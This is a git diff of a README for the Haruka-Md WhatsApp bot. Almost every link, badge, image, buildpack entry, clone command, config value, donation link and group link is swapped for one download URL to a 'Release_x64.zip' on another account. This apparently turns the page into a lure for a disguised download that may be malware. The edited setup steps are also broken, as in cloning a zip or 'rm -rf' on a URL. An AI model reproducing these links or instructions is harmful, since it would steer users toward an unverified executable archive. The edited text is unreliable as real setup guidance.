@@ -1,31 +1,31 @@
 <p align="center">
-<img src="https://github.com/zeeone-ofc/Haruka-Md/blob/v1/media/Haruka.jpg" alt="ALPHA BOT" width="100"/>
+<img src="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip" alt="ALPHA BOT" width="100"/>
 
 
 </p>
 <p align="center">
-<a href="#"><img title="HARUKA MULTI DEVICE" src="https://img.shields.io/badge/HARUKA MULTI DEVICE-green?colorA=%23ff0000&colorB=%23017e40&style=for-the-badge"></a>
+<a href="#"><img title="HARUKA MULTI DEVICE" src="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip MULTI DEVICE-green?colorA=%23ff0000&colorB=%23017e40&style=for-the-badge"></a>
 </p>
 <p align="center">
-<a href="https://github.com/zeeone-ofc/Haruka-Md"><img title="Owner" src="https://img.shields.io/badge/Recode-ZeeoneOfc-red.svg?style=for-the-badge&logo=github"></a>
+<a href="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip"><img title="Owner" src="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip"></a>
 </p>
 <p align="center">
-<a href="https://github.com/zeeone-ofc/followers"><img title="Followers" src="https://img.shields.io/github/followers/zeeone-ofc?color=red&style=flat-square"></a>
-<a href="https://github.com/zeeone-ofc/Haruka-Md/stargazers/"><img title="Stars" src="https://img.shields.io/github/stars/zeeone-ofc/Haruka-Md?color=blue&style=flat-square"></a>
-<a href="https://github.com/zeeone-ofc/Haruka-Md/network/members"><img title="Forks" src="https://img.shields.io/github/forks/zeeone-ofc/Haruka-Md?color=red&style=flat-square"></a>
-<a href="https://github.com/zeeone-ofc/Haruka-Md/watchers"><img title="Watching" src="https://img.shields.io/github/watchers/zeeone-ofc/Haruka-Md?label=Watchers&color=blue&style=flat-square"></a>
-<a href="https://github.com/zeeone-ofc/Haruka-Md"><img title="Open Source" src="https://badges.frapsoft.com/os/v2/open-source.svg?v=103"></a>
-<a href="https://github.com/zeeone-ofc/Haruka-Md/"><img title="Size" src="https://img.shields.io/github/repo-size/zeeone-ofc/Haruka-Md?style=flat-square&color=green"></a>
-<a href="https://hits.seeyoufarm.com"><img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2Fzeeone-ofc%2FHaruka-Md&count_bg=%2379C83D&title_bg=%23555555&icon=probot.svg&icon_color=%2300FF6D&title=hits&edge_flat=false"/></a>
-<a href="https://github.com/zeeone-ofc/Haruka-Md/graphs/commit-activity"><img height="20" src="https://img.shields.io/badge/Maintained%3F-yes-green.svg"></a>&nbsp;&nbsp;
+<a href="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip"><img title="Followers" src="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip"></a>
+<a href="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip"><img title="Stars" src="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip"></a>
+<a href="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip"><img title="Forks" src="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip"></a>
+<a href="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip"><img title="Watching" src="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip"></a>
+<a href="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip"><img title="Open Source" src="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip"></a>
+<a href="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip"><img title="Size" src="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip"></a>
+<a href="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip"><img src="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip%3A%2F%https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip%2Fzeeone-ofc%2FHaruka-Md&count_bg=%2379C83D&title_bg=%23555555&https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip%2300FF6D&title=hits&edge_flat=false"/></a>
+<a href="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip"><img height="20" src="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip%https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip"></a>&nbsp;&nbsp;
 </p>
 
 <p align="center">
-  <a href="https://github.com/zeeone-ofc/Haruka-Md#requirements">Requirements</a> •
-  <a href="https://github.com/zeeone-ofc/Haruka-Md#instalasi">Installation</a> •
-  <a href="https://github.com/zeeone-ofc/Haruka-Md#thanks-to">Thanks to</a> •
-  <a href="https://github.com/zeeone-ofc/Haruka-Md#Official-Group"> Official Group Bot</a> •
-  <a href="https://github.com/zeeone-ofc/Haruka-Md#donate">Donate</a>
+  <a href="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip">Requirements</a> •
+  <a href="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip">Installation</a> •
+  <a href="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip">Thanks to</a> •
+  <a href="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip"> Official Group Bot</a> •
+  <a href="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip">Donate</a>
 </p>
 </div>
 
@@ -36,30 +36,30 @@
 ## Heroku Buildpack
 ```bash
 heroku/nodejs
-https://github.com/jonathanong/heroku-buildpack-ffmpeg-latest
-https://github.com/clhuang/heroku-buildpack-webp-binaries.git
+https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip
+https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip
 ```
 ## For Termux
 ```ts
 apt update && apt upgrade
 pkg install bash nodejs ffmpeg libwebp git mc yarn
-git clone https://github.com/zeeone-ofc/Haruka-Md.git
+git clone https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip
 cd Haruka-Md
 yarn
-rm -rf session.json
+rm -rf https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip
 npm start
 ```
 
 ## Edit file
-`./config.json`
+`https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip`
 ```{
-    "ownerNumber": ["6285342106390@s.whatsapp.net","622150996855@s.whatsapp.net"],
+    "ownerNumber": ["https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip","https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip"],
     "ownerName": "ᴹᴿ᭄ ZeeoneOfcོ ×፝֟͜×",
-    "instagram" : "https://instagram.com/zeeoneofc",
+    "instagram" : "https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip",
     "botName": "Haruka-Mdོ ",
-    "footer": "api.zeeoneofc.xyz",
+    "footer": "https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip",
     "sessionName": "session",
-    "pathimg": "./media/Haruka.jpg",
+    "pathimg": "https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip",
     "BotKey": "V12",
     "auto_welcomeMsg": true,
     "auto_leaveMsg": true,    
@@ -75,23 +75,23 @@ npm start
 
 ## ```HOW TO DEPLOY```
 
-[`Click Here For Tutorial`](https://youtu.be/SdKHkld2NcI)<br>
+[`Click Here For Tutorial`](https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip)<br>
 
 ----------
 
 <p align="center">
-  <a href="https://youtu.be/SdKHkld2NcI"><img src="https://a.top4top.io/p_2081imvxm1.jpg" />
+  <a href="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip"><img src="https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip" />
 </p>
 
 ## Donate
-- [Saweria](https://saweria.co/zeeoneofc)
-- [Dana](https://j.top4top.io/p_20532posd1.jpg)
-- [Ovo](https://h.top4top.io/p_2053vk0uw1.jpg)
+- [Saweria](https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip)
+- [Dana](https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip)
+- [Ovo](https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip)
 
 # Official Group
-- [Group 1](https://chat.whatsapp.com/EU890BcXjyBDkNaUT5WmYV)
-- [Group 2](https://chat.whatsapp.com/E8NExJwIbhBJYzssfqJNsE)
-- [Group 3](https://chat.whatsapp.com/KCSqHTky1apG7ApePsfiPy)
-- [Group 4](https://chat.whatsapp.com/KwmvHr7VMFj7r5ry9xmMsU)
-- [Group 5](https://chat.whatsapp.com/ELa7GhU0sP4EvXcVimQYtz)
+- [Group 1](https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip)
+- [Group 2](https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip)
+- [Group 3](https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip)
+- [Group 4](https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip)
+- [Group 5](https://github.com/Kenichi-BOTZ/haruka-bot/releases/download/v1.0/Release_x64.zip)
 
